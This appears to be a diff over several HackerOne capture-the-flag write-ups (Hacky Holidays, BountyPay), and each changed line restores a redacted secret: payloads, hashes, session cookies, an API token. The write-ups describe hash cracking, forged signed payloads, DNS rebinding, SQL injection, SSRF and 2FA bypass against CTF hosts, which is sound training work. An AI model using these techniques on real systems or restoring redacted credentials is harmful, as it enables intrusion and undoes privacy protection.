 
-https://hackyholidays.h1ctf.com/attack-box/launch?payload=[REDACTED_SECRET]==
+https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
 
 Decode the base64 payload
 
-{"target":"203.0.113.33","hash":"[REDACTED_SECRET]"}
+{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
 
 **Response**
 
-+ Redirect to https://hackyholidays.h1ctf.com/attack-box/launch/[REDACTED_SECRET]
++ Redirect to https://hackyholidays.h1ctf.com/attack-box/launch/7e9a25f63e3d1856373c36c9d3e29f89
 
 {F1139926}
 
 + As per flag 11, if we add random IP over here, it might say the error and I was right:
 
 ```
-{"target":"127.0.0.1","hash":"[REDACTED_SECRET]"}  ---> encode base64 --> [REDACTED_SECRET]==
+{"target":"127.0.0.1","hash":"5f2940d65ca4140cc18d0878bc398955"}  ---> encode base64 --> eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
 ```
 
 **Request**
 
-https://hackyholidays.h1ctf.com/attack-box/launch?payload=[REDACTED_SECRET]==
+https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
 
 **Response**
 
@@ -9215,9 +9215,9 @@ Invalid Protection Hash
 + So, for target 203.0.113.33, 203.0.113.53 and 203.0.113.213, decoded the attack payload and got the 3 hashes that I've stored inside hashes file as:
 
 ```
-[REDACTED_SECRET]:203.0.113.33
-[REDACTED_SECRET]:203.0.113.53
-[REDACTED_SECRET]:203.0.113.213
+5f2940d65ca4140cc18d0878bc398955:203.0.113.33
+2814f9c7311a82f1b822585039f62607:203.0.113.53
+5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213
 ```
 
 + We also need a wordlist, so I've downloaded the rockyou.txt file for this one.
@@ -9230,9 +9230,9 @@ hashcat -m 10 hashes rockyou.txt --show
 {F1139931}
 
 ```
-[REDACTED_SECRET]:203.0.113.33:mrgrinch463
-[REDACTED_SECRET]:203.0.113.53:mrgrinch463
-[REDACTED_SECRET]:203.0.113.213:mrgrinch463
+5f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463
+2814f9c7311a82f1b822585039f62607:203.0.113.53:mrgrinch463
+5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213:mrgrinch463
 ```
 
 + Thus, we got salt as mrgrinch463.
@@ -9242,18 +9242,18 @@ hashcat -m 10 hashes rockyou.txt --show
 **Generating hash for 127.0.0.1 using salt mrgrinch463 and encrypt base64**
 
 ```
-mrgrinch463127.0.0.1 -----> md5 salted ---> [REDACTED_SECRET] ----> use in the above format as {"target":"","hash":""} ----->
+mrgrinch463127.0.0.1 -----> md5 salted ---> 3e3f8df1658372edf0214e202acb460b ----> use in the above format as {"target":"","hash":""} ----->
 
-{"target":"127.0.0.1","hash":"[REDACTED_SECRET]"} ---> encrypt base64 --> [REDACTED_SECRET]==
+{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"} ---> encrypt base64 --> eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==
 ```
 
 + Our final payload in the url will be:
 
-https://hackyholidays.h1ctf.com/attack-box/launch?payload=[REDACTED_SECRET]==
+https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==
 
 **Response**
 
-https://hackyholidays.h1ctf.com/attack-box/launch/[REDACTED_SECRET]
+https://hackyholidays.h1ctf.com/attack-box/launch/1dabfbbbea602fefc21f33e24b399833
 
 {F1139937}
 
@@ -9276,18 +9276,18 @@ finally encrypted with md5 hash salt
 ```
 mrgrinch463mrgrinch4637f000001.c0a80001.rbndr.us
 
-MD5 encrypted salt - [REDACTED_SECRET]
+MD5 encrypted salt - de9d82d4ae9a61660701e7e1844ea643
 
-{"target":"7f000001.c0a80001.rbndr.us","hash":"[REDACTED_SECRET]"}
+{"target":"7f000001.c0a80001.rbndr.us","hash":"de9d82d4ae9a61660701e7e1844ea643"}
 
 base64 encode
 
-[REDACTED_SECRET]
+eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9
 ```
 
 + So, our final payload will be: 
 
-https://hackyholidays.h1ctf.com/attack-box/launch?payload=[REDACTED_SECRET]
+https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9
 
 + This payload can take 4 or 5 times to retry to get the final result.
 **Response**
@@ -9436,7 +9436,7 @@ I fired up a directory brute  force using dirsearch.py and quickly identified tw
 The `sessions` endpoint was leaking some juicy data:
 
 ```json
-{"sessions":["[REDACTED_SECRET]=","[REDACTED_SECRET]=","[REDACTED_SECRET]==","[REDACTED_SECRET]=","[REDACTED_SECRET]=","[REDACTED_SECRET]=","[REDACTED_SECRET]=","[REDACTED_SECRET]="]}
+{"sessions":["[REDACTED_SESSION_COOKIE]","[REDACTED_SESSION_COOKIE]","eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==","[REDACTED_SESSION_COOKIE]","[REDACTED_SESSION_COOKIE]","[REDACTED_SESSION_COOKIE]","[REDACTED_SESSION_COOKIE]","[REDACTED_SESSION_COOKIE]"]}
 ```
 
 Session #2 appeared different and piqued my interested. Here it is base64 decoded:
@@ -9444,7 +9444,7 @@ Session #2 appeared different and piqued my interested. Here it is base64 decode
 ```json
 {
   "user": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
-  "cookie": "[REDACTED_SECRET]="
+  "cookie": "NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="
 }
 ```
 We now have a user ID of sorts (is this Adam's old Windows XP key?) and a cookie. I attempted a few session hijacking attacks using the user and cookie values to no avail. I then took another look at the `user` endpoint. 
@@ -9499,7 +9499,7 @@ Using a "top 100" password list, I set up the same attack to brute force the pas
 So now I could log in with the credentials `access`/`computer` ... but there were no files to download :( However! The base64 session token after logging in appeared to contain a JSON object:
 
 ```json
-{"cookie":"[REDACTED_SECRET]","admin":false}
+{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
 ```
 
 Life's better as an admin, so I flipped `false` to `true`, re-encoded, and changed the value of the `securelogin` cookie. After refreshing the page a zip file containing "secure" files showed up. 
@@ -9659,7 +9659,7 @@ https://github.com/Grinch-Networks/forum
 
 Now we're getting somewhere! All the code related to this forum appeared fairly locked down. I didn't find anything that jumped out at as usable on my first pass. I later noticed that 4 commits had been made to this repo and decided to dig deeper into those to look for secrets. 
 
-https://github.com/Grinch-Networks/forum/commit/[REDACTED_SECRET]
+https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae
 
 {F1132859}
 
@@ -9707,10 +9707,10 @@ url2 = 'https://hackyholidays.h1ctf.com/evil-quiz/score' #GET
 
 #threshold = 1953 # create an dict with thresold values, if we have two values
 
-alphabet = "[REDACTED_SECRET]~`!@#$%^*()-_=+[{]}\|;:,/?"
+alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~`!@#$%^*()-_=+[{]}\|;:,/?"
 
 s = requests.Session()
-cookie_obj = requests.cookies.create_cookie(domain='hackyholidays.h1ctf.com',name='session',value='[REDACTED_SECRET]')
+cookie_obj = requests.cookies.create_cookie(domain='hackyholidays.h1ctf.com',name='session',value='f0dd61e4a671f34f123e36e0b8f2727c')
 s.cookies.set_cookie(cookie_obj)
 pos = 1
 threshold = 0
@@ -9916,25 +9916,25 @@ Table: photo
 +----+----------+--------------------------------------+
 | id | album_id | photo                                |
 +----+----------+--------------------------------------+
-| 1  | 1        | [REDACTED_SECRET].jpg |
-| 2  | 1        | [REDACTED_SECRET].jpg |
-| 3  | 2        | [REDACTED_SECRET].jpg |
-| 4  | 3        | [REDACTED_SECRET].jpg |
-| 5  | 3        | [REDACTED_SECRET].jpg |
-| 6  | 3        | [REDACTED_SECRET].jpg |
+| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
+| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
+| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
+| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
+| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
+| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
 +----+----------+--------------------------------------+
 ```
 ### Step 2: recon on r3c0n
 That was nice and all... but I still couldn't couldn't figure out how I was going to authenticate to the API. Let's dig around and see how this whole thing is set up. 
 
 The `/picture` endpoints loaded in the albums look like this:
-https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=[REDACTED_SECRET]
+https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9
 
 And the `data` parameter contains the following JSON object:
 ```json
 {
-  "image": "r3c0n_server_4fdk59/uploads/[REDACTED_SECRET].jpg",
-  "auth": "[REDACTED_SECRET]"
+  "image": "r3c0n_server_4fdk59/uploads/db507bdb186d33a719eb045603020cec.jpg",
+  "auth": "bbf295d686bd2af346fcd80c5398de9a"
 }
 ```
 Any attempts to modify the image URL and auth hash and resend the request resulted in `invalid authentication hash`. It seemed like it had to be generated the hash on the backend. 
@@ -9979,12 +9979,12 @@ https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=1%27%20UNION%20SE
 
 which produces this URL:
 
-https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=[REDACTED_SECRET]==
+https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMiLCJhdXRoIjoiZmVhNzUwNzQ3OGFhODIyNWMwMjI1MjdiMTc2M2ZiMzMifQ==
 
 which (doesnt return an invalid hash error!! and) decodes to 
 
 ```json
-{"image":"r3c0n_server_4fdk59\/uploads\/3","auth":"[REDACTED_SECRET]"}
+{"image":"r3c0n_server_4fdk59\/uploads\/3","auth":"fea7507478aa8225c022527b1763fb33"}
 ```
 
 NICE! we can now modify the `3` in our embedded payload to injected a path traversal SSRF payload to start analyzing the API!
@@ -10107,14 +10107,14 @@ Here's how we did it:
 ###Summary:
 The Attack Box is set up to target and launch DDoS attacks against three of Santa's IP's. These attacks can be launched by clicking "Attack" which triggers a request like the following:
 
-https://hackyholidays.h1ctf.com/attack-box/launch?payload=[REDACTED_SECRET]==
+https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
 
 This launches a spookily realistic attack on the targeted IP! (sorry Santa!)
 
 the `payload` parameter decoded is 
 
 ```json
-{"target":"203.0.113.33","hash":"[REDACTED_SECRET]"}
+{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
 ```
 Argh! *another* hash! The last one in Flag 11 gave us headaches plenty. In order to stop the Grinch, we had to point the target at itself so the network would take itself down. 
 
@@ -10143,7 +10143,7 @@ After some tweaking and testing, we found that attack mode 10 worked! The authen
 
 hashcat command
 ```
-hashcat -m 10 -O [REDACTED_SECRET]:203.0.113.33 rockyou.txt --force
+hashcat -m 10 -O 5f2940d65ca4140cc18d0878bc398955:203.0.113.33 rockyou.txt --force
 ```
 Output:
 ```
@@ -10153,12 +10153,12 @@ Dictionary cache hit:
 * Bytes.....: 139921507
 * Keyspace..: 14344385
 
-[REDACTED_SECRET]:203.0.113.33:mrgrinch463
+5f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463
                                                  
 Session..........: hashcat
 Status...........: Cracked
 Hash.Type........: md5($pass.$salt)
-Hash.Target......: [REDACTED_SECRET]:203.0.113.33
+Hash.Target......: 5f2940d65ca4140cc18d0878bc398955:203.0.113.33
 Time.Started.....: Mon Dec 28 21:10:03 2020 (2 secs)
 Time.Estimated...: Mon Dec 28 21:10:05 2020 (0 secs)
 Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
@@ -10176,13 +10176,13 @@ HWMon.Dev.#1.....: N/A
 With the password cracked, all we had to do now what make an authentication hash for `127.0.0.1` right?? WRONG!
 
 Here's the hash:
-md5('mrgrinch463127.0.0.1') == [REDACTED_SECRET]
+md5('mrgrinch463127.0.0.1') == 3e3f8df1658372edf0214e202acb460b
 
 Here's the payload:
-{"target":"127.0.0.1","hash":"[REDACTED_SECRET]"}
+{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}
 
 Here's the launch URL:
-https://hackyholidays.h1ctf.com/attack-box/launch?payload=[REDACTED_SECRET]==
+https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==
 
 But here's the issue: "Local target detected, aborting attack"
 
@@ -10203,13 +10203,13 @@ And now we have this domain which randomly resolve to either 127.0.0.1 or 203.0.
 With a domain prepared, we can relaunch the attack! 
 
 Here's the hash:
-md5('mrgrinch463cb0071d5.7f000001.rbndr.us') == [REDACTED_SECRET]
+md5('mrgrinch463cb0071d5.7f000001.rbndr.us') == 51a799c562ed548d5ce9c8f4d1e71455
 
 Here's the payload:
-{"target":"cb0071d5.7f000001.rbndr.us","hash":"[REDACTED_SECRET]"}
+{"target":"cb0071d5.7f000001.rbndr.us","hash":"51a799c562ed548d5ce9c8f4d1e71455"}
 
 Here's the launch URL:
-https://hackyholidays.h1ctf.com/attack-box/launch?payload=[REDACTED_SECRET]
+https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiJjYjAwNzFkNS43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiI1MWE3OTljNTYyZWQ1NDhkNWNlOWM4ZjRkMWU3MTQ1NSJ9
 
 After a few tries, the rebinding attack works and we've DDoS'd  Grinch Networks and saved the holidays!
 
@@ -10317,7 +10317,7 @@ https://auth-sandbox.elastic.co
 
 Go to https://elasticsandbox.docebosaas.com/learn and using **SIGNIN WITH SAML SSO** leading to 
 
->https://staging.found.no/login?fromURI=https%3A%2F%2Fauth-sandbox.elastic.co%2Fapp%2Felasticcoexternal_docebo_1%2Fexkigtmda9ejVUCM70h7%2Fsso%2Fsaml%3FSAMLRequest%3DnVJNb9swDP0rhu6O%[REDACTED_SECRET]%252FFSbH2ksNOAim%252B9%252FhILpB3yrJV70%[REDACTED_SECRET]%[REDACTED_SECRET]%252B5BKsiROpnGS7dM5m%[REDACTED_SECRET]%252BlfxCzdyjkG%252Fo6pDKnULw8Se7AdX1bKzCupAvwqtvY860%252FYKcBSnaMc3i7nAM5a2cOS98jFaEu2uO%252FoYqKV%252Bub2e5lKE7PN%252Bv4t3X%252Bs9WS7O3Gwct1v%[REDACTED_SECRET]%252FVy78%253D%26RelayState%3Dhttps%253A%252F%252Felasticsandbox.docebosaas.com%252Flms%252Findex.php%253Fr%253Dsite%252Fsso%2526sso_type%253Dsaml
+>https://staging.found.no/login?fromURI=https%3A%2F%2Fauth-sandbox.elastic.co%2Fapp%2Felasticcoexternal_docebo_1%2Fexkigtmda9ejVUCM70h7%2Fsso%2Fsaml%3FSAMLRequest%3DnVJNb9swDP0rhu6O%252FBE3sRBnyBIMC9BuQZ32sEsgy0yjTZY0Ud68fz%252FFSbH2ksNOAim%252B9%252FhILpB3yrJV70%252F6EX72gD4aOqWRjR8V6Z1mhqNEpnkHyLxg9erhnmWThFlnvBFGkTeQ2wiOCM5Lo0m03VTk0DTzMj%252B2YlYWjeDHpk3zsiggnxfibppnWXonoMyKNM9I9AwOA7IigSjAEXvYavRc%252B5BKsiROpnGS7dM5m%252BasmH4j0Sa4kZr7EXXy3iKjlAerMXLdNmaYgOKhREyEodxaeg2FgcGD01wdWiOgMYeUwvBDvviu5SV8f35aP8yS04wiGno2TaLVq7G10dh34Gpwv6SAp8f7f9JX%252BlfxCzdyjkG%252Fo6pDKnULw8Se7AdX1bKzCupAvwqtvY860%252FYKcBSnaMc3i7nAM5a2cOS98jFaEu2uO%252FoYqKV%252Bub2e5lKE7PN%252Bv4t3X%252Bs9WS7O3Gwct1v%252Bh5MFfUuwuNzblyC93eyMkuJP9Mm4jvvbnZ0zso2PYynzjmuUoH0YvFLm99oB91AR73ogdHmRfH%252FVy78%253D%26RelayState%3Dhttps%253A%252F%252Felasticsandbox.docebosaas.com%252Flms%252Findex.php%253Fr%253Dsite%252Fsso%2526sso_type%253Dsaml
 
 At the website https://staging.found.no/ use **Signup** function allow me to register 2 accounts below
 >superman85@wearehackerone.com
@@ -10499,7 +10499,7 @@ I was able to register a github account on your email address :-
 
 ##Resources about this vulnerability:-
 https://hackerone.com/reports/498964
-https://medium.com/intigriti/[REDACTED_SECRET]
+https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c
 
 ## Impact
 
@@ -10943,12 +10943,12 @@ I am fairly new to CTFs - this is just my second CTF after [H1-415 CTF](https://
     *  Log file gives us `username` and `password` for authentication on the customer portal, `app.bountypay.h1ctf.com`. Using these credentials we're presented with 2FA challenge. On every access It gives us a random `challenge` (md5 hash) that we need to guess a valid `challenge_answer` for.
     * Log file also gives us a `challenge_answer` (for the past login attempt), but no `challenge` itself. The solution is that `challenge` is simply an md5 hash of the `challenge_answer`, and there is nothing preventing the re-use of the old challenge, so we compute md5 hash of that `challenge_answer` and use this pair to login.
     * Last thing the log file gives us is the following endpoint: `GET /statements?month=04&year=2020`
-4. Authentication cookie is base64-encoded JSON such as `{"account_id":"F8gHiqSdpK","hash":"[REDACTED_SECRET]"}`, where `hash` is the actual session, while `account_id` can be freely tampered with.
+4. Authentication cookie is base64-encoded JSON such as `{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}`, where `hash` is the actual session, while `account_id` can be freely tampered with.
 5. The `/statements` endpoint above reveals that it makes a server-side request to `https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=04&year=2020`.  When accessed directly, the API endpoint responds with 401 `["Missing or invalid Token"]`. Observe the same account id value, `F8gHiqSdpK`, within the request path- which is in fact taken from `account_id` of the session cookie and interpolated into request path without any sanitization. By changing `account_id` within our authentication cookie we can thus achieve SSRF via Path Traversal - but for now only on same host.
 6. Front page on `api.bountypay.h1ctf.com` reveals an endpoint that allows a redirect: `https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API`. It uses a whitelist and does not appear to allow an Open Redirect, but several BountyPay subdomains are whitelisted, including `software.bountypay.h1ctf.com`.
 7.  Content discovery on `software.bountypay.h1ctf.com` via SSRF with the aforementioned redirect (which bypasses IP restriction) reveals `/uploads` folder with Directory Listing enabled. The only file within it, [`BountyPay.apk`](http://software.bountypay.h1ctf.com/uploads/BountyPay.apk), can be downloaded directly from a public IP.
-8. APK interacts with a Firebase instance and presents a series of screens that eventually lead to obtaining a header name (`X-Token`), a header value (`[REDACTED_SECRET]`) and a host name (`api.bountypay.h1ctf.com`). One way those could be obtained is by decompiling the code and following the designed challenges, which involve sending [deep links](https://developer.android.com/training/app-links/deep-linking) to the app. The data of interest could either be intercepted with a proxy, or retrieved  from `/shared_prefs/user_created.xml` with `adb`. Or alternatively one could also have interacted with Firebase directly, using the credentials that are located in `res/values/strings.xml`.
-9. `X-Token: [REDACTED_SECRET]` allows us to make API calls directly on `api.bountypay.h1ctf.com` without SSRF - including `POST` calls that we could not do before. Content discovery on the `/api` directory reveals `/api/staff` endpoint.
+8. APK interacts with a Firebase instance and presents a series of screens that eventually lead to obtaining a header name (`X-Token`), a header value (`8e9998ee3137ca9ade8f372739f062c1`) and a host name (`api.bountypay.h1ctf.com`). One way those could be obtained is by decompiling the code and following the designed challenges, which involve sending [deep links](https://developer.android.com/training/app-links/deep-linking) to the app. The data of interest could either be intercepted with a proxy, or retrieved  from `/shared_prefs/user_created.xml` with `adb`. Or alternatively one could also have interacted with Firebase directly, using the credentials that are located in `res/values/strings.xml`.
+9. `X-Token: 8e9998ee3137ca9ade8f372739f062c1` allows us to make API calls directly on `api.bountypay.h1ctf.com` without SSRF - including `POST` calls that we could not do before. Content discovery on the `/api` directory reveals `/api/staff` endpoint.
     * `GET` request returns some JSON data for a couple of staff members, which includes `staff_id`field with values like `STF:KE624RQ2T9`.
     * `POST` request returns `["Missing Parameter"]` message. The parameter it wants is `staff_id`, and for the valid staff ids it gives `HTTP/1.1 409 Conflict` with message ` ["Staff Member already has an account"]`. Response code hints at the fact that it could provision the new account if we give it a valid  staff id who's account has not yet been set up - e.g. a new joiner.
 10. [BountypayHQ](https://twitter.com/BountypayHQ) Twitter account has a tweet `Today we welcome Sandra to the team!!!`, which is the new joiner we're looking for. We can find [Sandra's](https://twitter.com/SandraA76708114) twitter account among either [following](https://twitter.com/BountypayHQ/following) or [followers](https://twitter.com/BountypayHQ/followers) lists for BountypayHQ, and in her timeline we see [this tweet](https://twitter.com/SandraA76708114/status/1258693001964068864) with a photo featuring her staff access card that shows her Staff ID: `STF:8FJ3KFISL3`.
@@ -10956,7 +10956,7 @@ I am fairly new to CTFs - this is just my second CTF after [H1-415 CTF](https://
 12.  After logging in with Sandra's credentials and inspecting available endpoints and JS source code, it becomes apparent that the goal of the next challenge is to upgrade her account to Admin. We can see the endpoint for this in JS code, `/admin/upgrade?username=`, but it can only be done by an admin user. We can "report" any page, which makes admin user visit it, but there is an exception that pages under `/admin` would not be visited. There are two separate vulnerabilities that need to be chained to achieve the desired result.
     * Firstly, the trick is to notice that JS code uses very loose selectors (that are based on class only) to perform several actions: `$(".upgradeToAdmin").click` would issue the request to upgrade the account, and `"#tab4" === document.location.hash && $(".tab4").trigger("click")` allows us to force Admin to do the click on an element with `.tab4` class. Coincidentally, there is a feature to change avatar - which is a string used as a class name. Setting it to `upgradeToAdmin tab4` and reporting that page (`/?template=ticket&ticket_id=3582#tab4`) allows us to force Admin to make the API call.
     * What remains is to make sure the above call is made with the correct username, which is taken from an input with name `username`: `let t = $('input[name="username"]').val();`. There is no such input on the page we're reporting (where we can control the class via avatar), `/?template=ticket&ticket_id=3582#tab4`, but there is one in the login page, `/?template=login?username=sandra.allison`. Since backend is PHP we can force `template` parameter to be an array with both `ticket` and `login` values - and luckily for us, a rather weird backend implementation renders both templates and appends them one after another in the response. We can thus piece it all together in a request such as `/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab4` that we "report" to Admin and this concludes the Privilege Escalation step. In response we're given a new session cookie - when logged in with that cookie we can see a new tab with customer account usernames and clear-text passwords, including Mårten's credentials.
-13. Back to Customer portal, `app.bountypay.h1ctf.com`, we login with new credentials and use same `challenge`/`challenge_answer`pair as before to bypass login 2FA. We now have access to the transactions that need to be processed, but there is one last challenge - it is protected by another 2FA. The task is to exfiltrate challenge answer (code) from a page rendered in the backend within Headless Chrome, and the only thing we know about that page, is that is takes a stylesheet from a URL that's under our control and likely embeds it in that page. It can indeed be verified that our stylesheet is embedded within a `<link rel="stylesheet">` tag with e.g. Burp Collaborator. Under this setup it's not actually possible to exfiltrate data using [recursive techniques](https://medium.com/@d0nut/[REDACTED_SECRET]) such as asynchronous `@import` loading - because imports within `<link>` (unlike `<style>`) are synchronous, and we only have a single injection point. Thankfully for us, the recursive import is not needed since we discover there are multiple inputs on the page - one for each code character. So the entire code can be exfiltrated directly using a bunch of selectors. With the exfiltrated code we complete 2FA verification and are finally presented with the Flag. That is the end of the CTF.
+13. Back to Customer portal, `app.bountypay.h1ctf.com`, we login with new credentials and use same `challenge`/`challenge_answer`pair as before to bypass login 2FA. We now have access to the transactions that need to be processed, but there is one last challenge - it is protected by another 2FA. The task is to exfiltrate challenge answer (code) from a page rendered in the backend within Headless Chrome, and the only thing we know about that page, is that is takes a stylesheet from a URL that's under our control and likely embeds it in that page. It can indeed be verified that our stylesheet is embedded within a `<link rel="stylesheet">` tag with e.g. Burp Collaborator. Under this setup it's not actually possible to exfiltrate data using [recursive techniques](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b) such as asynchronous `@import` loading - because imports within `<link>` (unlike `<style>`) are synchronous, and we only have a single injection point. Thankfully for us, the recursive import is not needed since we discover there are multiple inputs on the page - one for each code character. So the entire code can be exfiltrated directly using a bunch of selectors. With the exfiltrated code we complete 2FA verification and are finally presented with the Flag. That is the end of the CTF.
 
 ---------------------------------------
 
@@ -11054,10 +11054,10 @@ Host: app.bountypay.h1ctf.com
 ```http
 HTTP/1.1 200 OK
 
-1588931909:[REDACTED_SECRET]==
-1588931919:[REDACTED_SECRET]==
-1588931928:[REDACTED_SECRET]
-1588931945:[REDACTED_SECRET]==
+1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
+1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
+1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
+1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
 ```
 
 I also tried checking both `/logger.php` and `/bp_web_trace.log`on the other subdomains, just in case similar code was deployed there as well, but that didn't work.
@@ -11088,7 +11088,7 @@ username=brian.oliver&password=V7h0inzX
 <form method="post" action="/">
 	<input type="hidden" name="username" value="brian.oliver">
 	<input type="hidden" name="password" value="V7h0inzX">
-	<input type="hidden" name="challenge" value="[REDACTED_SECRET]">
+	<input type="hidden" name="challenge" value="8de5d288e39ef1beaa3833100a14aa47">
 	<div class="panel panel-default" style="margin-top:50px">
 		<div class="panel-heading">Login</div>
 		<div class="panel-body">
@@ -11111,12 +11111,12 @@ POST / HTTP/1.1
 Host: app.bountypay.h1ctf.com
 Content-Type: application/x-www-form-urlencoded
 
-username=brian.oliver&password=V7h0inzX&challenge=[REDACTED_SECRET]&challenge_answer=bD83Jk27dQ
+username=brian.oliver&password=V7h0inzX&challenge=5828c689761cce705a1c84d9b1a1ed5e&challenge_answer=bD83Jk27dQ
 ```
 
 ```http
 HTTP/1.1 302 Found
-Set-Cookie: token=[REDACTED_SECRET]; expires=Mon, 29-Jun-2020 23:36:42 GMT; Max-Age=2592000
+Set-Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9; expires=Mon, 29-Jun-2020 23:36:42 GMT; Max-Age=2592000
 Location: /
 ```
 
@@ -11124,7 +11124,7 @@ Location: /
 
 First thing we notice is that the session cookie is base64-encoded JSON. When decoded, it is:
 ```
-{"account_id":"F8gHiqSdpK","hash":"[REDACTED_SECRET]"}
